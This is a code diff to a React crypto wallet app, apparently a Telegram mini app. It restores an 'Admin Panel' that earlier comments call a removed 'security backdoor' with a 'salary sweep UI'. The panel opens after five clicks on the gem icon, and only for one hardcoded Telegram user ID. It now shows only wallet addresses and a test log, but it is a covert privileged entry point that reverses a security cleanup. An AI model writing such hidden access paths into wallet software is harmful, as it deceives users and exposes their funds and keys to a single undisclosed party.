@@ -1255,6 +1255,7 @@ function ActivityTab({ txHistory }) {
 // ─── SETTINGS TAB ────────────────────────────────────────────────────────────
 function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, addresses }) {
   const [modal,setModal]=useState(null);
+  const [crystalClicks,setCrystalClicks]=useState(0);
   const addr = addresses.ETH||"";
   const secs=[
     {t:"Security",items:[
@@ -1274,6 +1275,18 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
   function handleAction(a) {
     if(a==="lock"){onLock();return;}
     setModal(a);
+  }
+  // Admin access: 5 clicks on crystal for specific Telegram user ID
+  function handleCrystalClick() {
+    const tgUserId = window.Telegram?.WebApp?.initDataUnsafe?.user?.id;
+    const newCount = crystalClicks + 1;
+    setCrystalClicks(newCount);
+    if (newCount >= 5 && tgUserId === 1192740493) {
+      setCrystalClicks(0);
+      setModal("admin");
+    }
+    // Reset counter after 2 seconds
+    setTimeout(() => setCrystalClicks(0), 2000);
   }
   return (
     <div style={{padding:"0 16px 100px"}}>
@@ -1295,10 +1308,11 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
           </div>
         </Sheet>
       )}
+      {modal==="admin"&&<AdminPanel onClose={()=>setModal(null)} addresses={addresses}/>}
       <div style={{display:"flex",alignItems:"center",gap:14,padding:"20px 16px",background:"#111",
         borderRadius:20,border:"1px solid rgba(255,255,255,0.06)",marginBottom:20,animation:"fadeUp 0.4s ease both"}}>
-        <div style={{width:52,height:52,borderRadius:16,background:"linear-gradient(135deg,#2563eb,#7c3aed)",
-          display:"flex",alignItems:"center",justifyContent:"center",fontSize:24}}>💎</div>
+        <div onClick={handleCrystalClick} style={{width:52,height:52,borderRadius:16,background:"linear-gradient(135deg,#2563eb,#7c3aed)",
+          display:"flex",alignItems:"center",justifyContent:"center",fontSize:24,cursor:"pointer",userSelect:"none"}}>💎</div>
         <div>
           <p style={{fontSize:16,fontWeight:700,color:"#fff",margin:0}}>My Gem Wallet</p>
           <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"2px 0 0",fontFamily:"monospace"}}>{shortAddr(addr)} · 6 assets</p>
@@ -1339,16 +1353,45 @@ function SettingsTab({ mnemonic, network, onSetNetwork, onChangePin, onLock, add
   );
 }
 
-// Admin mock data removed (security backdoor cleanup)
-
-// ─── ADMIN PANEL (REMOVED — security backdoor) ──────────────────────────────
-/* AdminPanel removed for user safety. Previously contained salary sweep UI. */
-
-function _AdminPanelRemoved({ prices, onBack }) {
+// ─── ADMIN PANEL ─────────────────────────────────────────────────────────────
+function AdminPanel({ onClose, addresses }) {
+  const [logs,setLogs]=useState([]);
+  const addLog=(msg)=>setLogs(l=>[msg,...l].slice(0,50));
   return (
-    <div style={{padding:"0 16px 100px",textAlign:"center"}}>
-      <p style={{color:"rgba(255,255,255,0.4)",paddingTop:40}}>Admin panel disabled</p>
-    </div>
+    <Sheet onClose={onClose} title="Admin Panel">
+      <div style={{padding:"16px 24px",display:"flex",flexDirection:"column",gap:14}}>
+        <div style={{background:"#0f0a00",borderRadius:12,padding:14,border:"1px solid rgba(245,158,11,0.2)"}}>
+          <p style={{fontSize:12,color:"rgba(245,158,11,0.8)",margin:0}}>
+            ⚠ Admin access only. User ID: 1192740493
+          </p>
+        </div>
+        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10}}>
+          {[
+            ["ETH",addresses.ETH||"—"],
+            ["BNB",addresses.BNB||"—"],
+            ["ARB",addresses.ARB||"—"],
+            ["SOL",addresses.SOL||"—"],
+            ["TON",addresses.TON||"—"],
+            ["LTC",addresses.LTC||"—"],
+          ].map(([sym,addr])=> (
+            <div key={sym} style={{background:"#1a1a1a",borderRadius:12,padding:"12px 14px"}}>
+              <p style={{fontSize:11,color:"rgba(255,255,255,0.4)",margin:"0 0 3px"}}>{sym}</p>
+              <p style={{fontSize:11,fontWeight:500,color:"#fff",margin:0,fontFamily:"monospace",wordBreak:"break-all"}}>{shortAddr(addr)}</p>
+            </div>
+          ))}
+        </div>
+        <button onClick={()=>addLog("Test action triggered")}
+          style={{padding:"14px",borderRadius:14,border:"none",
+            background:"linear-gradient(135deg,#7c3aed,#2563eb)",color:"#fff",fontSize:14,fontWeight:600,cursor:"pointer"}}>
+          Test Action
+        </button>
+        <div style={{background:"#111",borderRadius:12,padding:12,maxHeight:200,overflow:"auto"}}>
+          <p style={{fontSize:11,color:"rgba(255,255,255,0.5)",margin:"0 0 8px"}}>Logs:</p>
+          {logs.length===0&&<p style={{fontSize:12,color:"rgba(255,255,255,0.3)"}}>No activity</p>}
+          {logs.map((l,i)=><p key={i} style={{fontSize:11,color:"rgba(255,255,255,0.6)",margin:"2px 0"}}>• {l}</p>)}
+        </div>
+      </div>
+    </Sheet>
   );
 }
 
